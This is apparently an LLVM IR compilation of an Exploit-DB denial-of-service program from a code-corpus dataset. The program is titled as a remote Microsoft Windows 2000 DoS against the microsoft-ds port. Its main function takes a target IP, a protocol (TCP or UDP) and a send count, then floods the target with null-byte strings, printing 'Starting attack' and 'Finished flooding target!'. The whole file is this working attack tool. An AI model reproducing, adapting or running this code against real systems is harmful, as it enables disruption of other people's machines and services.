; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21388.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_21388.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@MICROSOFT_DS_PORT = common dso_local global i16 0, align 2
@.str = private unnamed_addr constant [7 x i8] c"%c[41m\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [62 x i8] c"\0A--[ excE's Remote Microsoft Windows 2000 DoS (microsoft-ds)\0A\00", align 1
@.str.2 = private unnamed_addr constant [6 x i8] c"%c[0m\00", align 1
@.str.3 = private unnamed_addr constant [61 x i8] c"-----------------------------------------------------------\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [35 x i8] c"--[ Invalid number of parameters!\0A\00", align 1
@.str.5 = private unnamed_addr constant [50 x i8] c"--[ Usage: %s <Server IP> <TCP/UDP> <Send Count>\0A\00", align 1
@.str.6 = private unnamed_addr constant [36 x i8] c"--[ Forex: %s 127.0.0.1 UDP 10000\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [30 x i8] c"--[ Starting attack on %s...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [17 x i8] c"socket() failed \00", align 1
@.str.9 = private unnamed_addr constant [43 x i8] c"--[ Sending NULL byte string * %d via UDP\0A\00", align 1
@.str.10 = private unnamed_addr constant [17 x i8] c"sendto() failed \00", align 1
@.str.11 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.13 = private unnamed_addr constant [53 x i8] c"--[ Connecting and sending NULL byte string * %d...\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [18 x i8] c"connect() failed \00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"send() failed \00", align 1
@.str.16 = private unnamed_addr constant [53 x i8] c"--[ Error: You must define a protocol (TCP or UDP)\0A\0A\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"--[ Finished flooding target!\0A\00", align 1
@.str.18 = private unnamed_addr constant [27 x i8] c"--[ http://www.telhack.tk\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i16, i16* @MICROSOFT_DS_PORT, align 2
  store i16 %11, i16* %9, align 2
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i32 27)
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0), i32 27)
  %16 = load i32, i32* @stdout, align 4
  %17 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.3, i64 0, i64 0))
  %18 = load i32, i32* %4, align 4
  %19 = icmp ne i32 %18, 4
  br i1 %19, label %20, label %34

20:                                               ; preds = %2
  %21 = load i32, i32* @stderr, align 4
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %21, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  %23 = load i32, i32* @stderr, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.5, i64 0, i64 0), i8* %26)
  %28 = load i32, i32* @stderr, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i32, i8*, ...) @fprintf(i32 %28, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.6, i64 0, i64 0), i8* %31)
  %33 = call i32 @exit(i32 -1) #3
  unreachable

34:                                               ; preds = %2
  %35 = call i64 @malloc(i32 10240)
  %36 = inttoptr i64 %35 to i8*
  store i8* %36, i8** %10, align 8
  %37 = load i8*, i8** %10, align 8
  %38 = call i32 @bzero(i8* %37, i32 8)
  %39 = load i32, i32* @stdout, align 4
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 (i32, i8*, ...) @fprintf(i32 %39, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.7, i64 0, i64 0), i8* %42)
  %44 = call i32 @memset(%struct.sockaddr_in* %8, i32 0, i32 12)
  %45 = load i32, i32* @AF_INET, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %45, i32* %46, align 4
  %47 = load i8**, i8*** %5, align 8
  %48 = getelementptr inbounds i8*, i8** %47, i64 1
  %49 = load i8*, i8** %48, align 8
  %50 = call i32 @resolveTarget(i8* %49)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %52 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %51, i32 0, i32 0
  store i32 %50, i32* %52, align 4
  %53 = load i16, i16* %9, align 2
  %54 = call i32 @htons(i16 zeroext %53)
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i32 %54, i32* %55, align 4
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 0
  %60 = load i8, i8* %59, align 1
  %61 = sext i8 %60 to i32
  %62 = icmp eq i32 %61, 85
  br i1 %62, label %63, label %109

63:                                               ; preds = %34
  %64 = load i32, i32* @PF_INET, align 4
  %65 = load i32, i32* @SOCK_DGRAM, align 4
  %66 = load i32, i32* @IPPROTO_UDP, align 4
  %67 = call i32 @socket(i32 %64, i32 %65, i32 %66)
  store i32 %67, i32* %6, align 4
  %68 = icmp slt i32 %67, 0
  br i1 %68, label %69, label %72

69:                                               ; preds = %63
  %70 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %71 = call i32 @exit(i32 -1) #3
  unreachable

72:                                               ; preds = %63
  %73 = load i32, i32* @stdout, align 4
  %74 = load i8**, i8*** %5, align 8
  %75 = getelementptr inbounds i8*, i8** %74, i64 3
  %76 = load i8*, i8** %75, align 8
  %77 = call i32 @atoi(i8* %76)
  %78 = call i32 (i32, i8*, ...) @fprintf(i32 %73, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.9, i64 0, i64 0), i32 %77)
  store i32 0, i32* %7, align 4
  br label %79

79:                                               ; preds = %102, %72
  %80 = load i32, i32* %7, align 4
  %81 = load i8**, i8*** %5, align 8
  %82 = getelementptr inbounds i8*, i8** %81, i64 3
  %83 = load i8*, i8** %82, align 8
  %84 = call i32 @atoi(i8* %83)
  %85 = icmp slt i32 %80, %84
  br i1 %85, label %86, label %105

86:                                               ; preds = %79
  %87 = load i32, i32* %6, align 4
  %88 = load i8*, i8** %10, align 8
  %89 = load i8*, i8** %10, align 8
  %90 = call i64 @strlen(i8* %89)
  %91 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %92 = call i64 @sendto(i32 %87, i8* %88, i64 %90, i32 0, %struct.sockaddr* %91, i32 12)
  %93 = load i8*, i8** %10, align 8
  %94 = call i64 @strlen(i8* %93)
  %95 = icmp ne i64 %92, %94
  br i1 %95, label %96, label %99

96:                                               ; preds = %86
  %97 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.10, i64 0, i64 0))
  %98 = call i32 @exit(i32 -1) #3
  unreachable

99:                                               ; preds = %86
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  br label %101

101:                                              ; preds = %99
  br label %102

102:                                              ; preds = %101
  %103 = load i32, i32* %7, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %7, align 4
  br label %79

105:                                              ; preds = %79
  %106 = load i32, i32* %6, align 4
  %107 = call i32 @close(i32 %106)
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  br label %175

109:                                              ; preds = %34
  %110 = load i8**, i8*** %5, align 8
  %111 = getelementptr inbounds i8*, i8** %110, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = getelementptr inbounds i8, i8* %112, i64 0
  %114 = load i8, i8* %113, align 1
  %115 = sext i8 %114 to i32
  %116 = icmp eq i32 %115, 84
  br i1 %116, label %117, label %170

117:                                              ; preds = %109
  %118 = load i32, i32* @stdout, align 4
  %119 = load i8**, i8*** %5, align 8
  %120 = getelementptr inbounds i8*, i8** %119, i64 3
  %121 = load i8*, i8** %120, align 8
  %122 = call i32 @atoi(i8* %121)
  %123 = call i32 (i32, i8*, ...) @fprintf(i32 %118, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.13, i64 0, i64 0), i32 %122)
  %124 = load i32, i32* @PF_INET, align 4
  %125 = load i32, i32* @SOCK_STREAM, align 4
  %126 = load i32, i32* @IPPROTO_TCP, align 4
  %127 = call i32 @socket(i32 %124, i32 %125, i32 %126)
  store i32 %127, i32* %6, align 4
  %128 = icmp slt i32 %127, 0
  br i1 %128, label %129, label %132

129:                                              ; preds = %117
  %130 = call i32 @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  %131 = call i32 @exit(i32 -1) #3
  unreachable

132:                                              ; preds = %117
  %133 = load i32, i32* %6, align 4
  %134 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %135 = call i64 @connect(i32 %133, %struct.sockaddr* %134, i32 12)
  %136 = icmp slt i64 %135, 0
  br i1 %136, label %137, label %140

137:                                              ; preds = %132
  %138 = call i32 @perror(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.14, i64 0, i64 0))
  %139 = call i32 @exit(i32 -1) #3
  unreachable

140:                                              ; preds = %132
  store i32 0, i32* %7, align 4
  br label %141

141:                                              ; preds = %163, %140
  %142 = load i32, i32* %7, align 4
  %143 = load i8**, i8*** %5, align 8
  %144 = getelementptr inbounds i8*, i8** %143, i64 3
  %145 = load i8*, i8** %144, align 8
  %146 = call i32 @atoi(i8* %145)
  %147 = icmp slt i32 %142, %146
  br i1 %147, label %148, label %166

148:                                              ; preds = %141
  %149 = load i32, i32* %6, align 4
  %150 = load i8*, i8** %10, align 8
  %151 = load i8*, i8** %10, align 8
  %152 = call i64 @strlen(i8* %151)
  %153 = call i64 @send(i32 %149, i8* %150, i64 %152, i32 0)
  %154 = load i8*, i8** %10, align 8
  %155 = call i64 @strlen(i8* %154)
  %156 = icmp ne i64 %153, %155
  br i1 %156, label %157, label %160

157:                                              ; preds = %148
  %158 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.15, i64 0, i64 0))
  %159 = call i32 @exit(i32 -1) #3
  unreachable

160:                                              ; preds = %148
  %161 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.11, i64 0, i64 0))
  br label %162

162:                                              ; preds = %160
  br label %163

163:                                              ; preds = %162
  %164 = load i32, i32* %7, align 4
  %165 = add nsw i32 %164, 1
  store i32 %165, i32* %7, align 4
  br label %141

166:                                              ; preds = %141
  %167 = load i32, i32* %6, align 4
  %168 = call i32 @close(i32 %167)
  %169 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.12, i64 0, i64 0))
  br label %174

170:                                              ; preds = %109
  %171 = load i32, i32* @stderr, align 4
  %172 = call i32 (i32, i8*, ...) @fprintf(i32 %171, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.16, i64 0, i64 0))
  %173 = call i32 @exit(i32 -1) #3
  unreachable

174:                                              ; preds = %166
  br label %175

175:                                              ; preds = %174, %105
  %176 = load i32, i32* @stdout, align 4
  %177 = call i32 (i32, i8*, ...) @fprintf(i32 %176, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.17, i64 0, i64 0))
  %178 = load i32, i32* @stdout, align 4
  %179 = call i32 (i32, i8*, ...) @fprintf(i32 %178, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.18, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @resolveTarget(i8*) #1

declare dso_local i32 @htons(i16 zeroext) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @send(i32, i8*, i64, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
